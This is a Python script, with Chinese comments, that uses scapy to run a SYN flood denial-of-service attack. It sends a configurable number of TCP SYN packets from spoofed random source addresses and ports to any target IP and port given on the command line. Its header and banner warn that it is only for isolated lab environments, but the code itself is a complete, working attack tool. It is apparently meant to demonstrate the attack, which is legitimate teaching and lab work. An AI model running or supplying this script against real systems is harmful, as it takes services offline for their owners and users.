#!/usr/bin/env python3
"""
SYN Flood 攻击演示脚本
============================================
⚠️  仅限在隔离虚拟实验环境中使用！
⚠️  严禁在未授权的真实网络中使用！
============================================

原理：利用 TCP 三次握手缺陷，发送大量伪造 SYN 包
      耗尽目标半连接队列，导致无法接受新连接

用法:
  python syn_flood.py --target 192.168.1.10 --port 80
  python syn_flood.py --target 192.168.1.10 --port 80 --count 5000
"""
import argparse
import random
import sys
import time

try:
    from scapy.all import IP, TCP, send, conf
except ImportError:
    print("[!] 需要安装 scapy: pip install scapy")
    sys.exit(1)

# 静默模式
conf.verb = 0


def syn_flood(target_ip: str, target_port: int, count: int = 1000):
    """
    发送 SYN Flood 攻击包
    Args:
        target_ip: 目标 IP 地址
        target_port: 目标端口
        count: 发送包数量
    """
    print(f"""
╔══════════════════════════════════════╗
║       SYN Flood 攻击演示           ║
║  ⚠️  仅限实验环境使用！            ║
╚══════════════════════════════════════╝
""")

    print(f"[*] 目标: {target_ip}:{target_port}")
    print(f"[*] 数量: {count} 个 SYN 包")
    print(f"[*] 策略: 随机化源 IP + 源端口\n")

    start_time = time.time()

    for i in range(count):
        # 随机化源 IP（模拟分布式攻击）
        src_ip = f"10.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        src_port = random.randint(1024, 65535)
        seq_num = random.randint(100000, 999999999)

        # 构造 IP + TCP SYN 包
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(
            sport=src_port,
            dport=target_port,
            flags="S",  # SYN 标志位
            seq=seq_num,
            window=random.randint(1024, 65535),
        )

        send(ip_layer / tcp_layer)

        # 进度显示
        if (i + 1) % 100 == 0:
            elapsed = time.time() - start_time
            rate = (i + 1) / elapsed
            print(f"  [+] 进度: {i + 1}/{count} | 速率: {rate:.1f} pkt/s | "
                  f"耗时: {elapsed:.1f}s")

    total_time = time.time() - start_time
    avg_rate = count / total_time

    print(f"""
╔══════════════════════════════════════╗
║ 攻击完成！
║ 总发送: {count} 个包
║ 总耗时: {total_time:.1f} 秒
║ 平均速率: {avg_rate:.1f} pkt/s
╚══════════════════════════════════════╝
""")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="SYN Flood 攻击演示（仅限实验环境）"
    )
    parser.add_argument("--target", "-t", required=True, help="目标 IP 地址")
    parser.add_argument("--port", "-p", type=int, default=80, help="目标端口 (默认 80)")
    parser.add_argument("--count", "-c", type=int, default=1000, help="发送包数量 (默认 1000)")
    args = parser.parse_args()

    syn_flood(args.target, args.port, args.count)
